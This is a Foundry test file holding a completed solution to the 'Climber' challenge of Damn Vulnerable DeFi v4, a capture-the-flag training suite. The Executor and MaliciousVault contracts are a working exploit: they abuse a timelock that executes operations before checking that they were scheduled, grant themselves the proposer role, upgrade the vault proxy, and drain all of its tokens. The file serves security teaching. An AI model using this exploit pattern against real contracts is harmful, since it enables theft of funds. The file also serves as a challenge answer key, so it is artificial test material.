// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract MaliciousVault is UUPSUpgradeable {
    function withdrawFunds(address _token, address _recipient) external {
        DamnValuableToken(_token).transfer(_recipient, DamnValuableToken(_token).balanceOf(address(this)));
    }
    function _authorizeUpgrade(address) internal override {}
}

contract Executor {
    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;
    address recovery;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);
    bytes32 salt;

    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
    }

    /// @notice Use the fact that operations are executed before the operation id is checked
    function execute() external {
        // 1. Update time delay to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));

        // 2. We need to schedule the operation to update the delay to 0
        // If we set the target to the timelock again, we would need to pass the right params to match the operation id in schedule function
        // The problem is that we would need to put dataElements encoded in dataElements[1], which is not possible as we will know exact data
        // only after encoding, making this chicken-egg problem unsolvable
        // This can be solved by granting the proposer role to this contract, and put encoding for function call inside this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));

        // 3. Schedule a timelock operation to set the delay to 0
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeCall(Executor.scheduleOperation, ());

        // 4. Upgrade vault to a new implementation where we can withdraw all tokens
        // This is possible because timelock contract is the vault owner
        MaliciousVault newVault = new MaliciousVault();
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall,(address(newVault), bytes("")));

        timelock.execute(
            targets,
            values,
            dataElements,
            salt
        );

        // address(vault) is proxy address, so this will fallback to withdraw funds in new implementation
        MaliciousVault(address(vault)).withdrawFunds(address(token), recovery);
    }

    function scheduleOperation() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}


contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Executor executor = new Executor(vault, timelock, token, recovery);
        executor.execute();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
